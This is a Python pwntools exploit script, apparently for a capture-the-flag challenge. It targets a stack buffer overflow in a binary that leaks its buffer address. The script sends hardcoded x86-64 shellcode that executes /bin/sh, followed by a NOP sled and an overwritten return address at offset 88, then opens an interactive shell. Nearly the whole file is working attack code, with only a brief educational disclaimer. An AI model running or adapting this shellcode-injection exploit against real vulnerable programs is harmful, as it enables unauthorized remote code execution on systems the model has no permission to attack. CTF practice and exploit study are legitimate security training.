# This script is for educational purposes to demonstrate how a buffer overflow
# vulnerability can be exploited. Do not use this on systems you do not own.

from pwn import *

# --- Configuration ---
# You may need to adjust these values based on your specific environment
# and the compiled binary.

# The target binary
BINARY_PATH = './vuln'
# Set to True if running against a remote service
REMOTE = True
HOST = 'challs.watctf.org'
PORT = 1991

# --- Exploit ---

def exploit():
    """
    Crafts and sends the exploit payload.
    """
    # Start the process or connect to the remote service
    if REMOTE:
        p = remote(HOST, PORT)
    else:
        # Use GDB to debug the process if needed
        # p = gdb.debug(BINARY_PATH, '''
        #     continue
        # ''')
        p = process(BINARY_PATH)

    # 1. Leak the buffer address
    # The program helpfully prints the address of the buffer on the stack.
    p.recvuntil(b'Addr: ')
    leaked_addr_str = p.recvline().strip()
    buffer_addr = int(leaked_addr_str, 16)
    log.info(f"Leaked buffer address: {hex(buffer_addr)}")

    # 2. Prepare the shellcode
    # Standard x86-64 shellcode to execute /bin/sh
    # from http://shell-storm.org/shellcode/files/shellcode-806.php
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    # 3. Construct the payload
    # The offset to the return address needs to be found through debugging (e.g., with GDB).
    # For this specific binary, the distance from the start of our buffer to the
    # return address is 88 bytes.
    offset_to_ret = 88
    
    # We will fill the space between our shellcode and the return address with NOPs (No-Operation)
    # This creates a "NOP sled", which increases the reliability of the exploit. If the
    # return address is slightly off, it might land on a NOP and "slide" down to the shellcode.
    padding = b'\x90' * (offset_to_ret - len(shellcode))

    # The payload structure:
    # [Shellcode] + [Padding/NOPs] + [New Return Address]
    payload = shellcode + padding + p64(buffer_addr)

    log.info("Sending payload...")
    print("Payload (bytes):", payload)

    # 4. Send the payload
    p.sendline(payload)

    # 5. Interact with the shell
    log.success("Payload sent! You should now have a shell.")
    p.interactive()

if __name__ == "__main__":
    exploit()
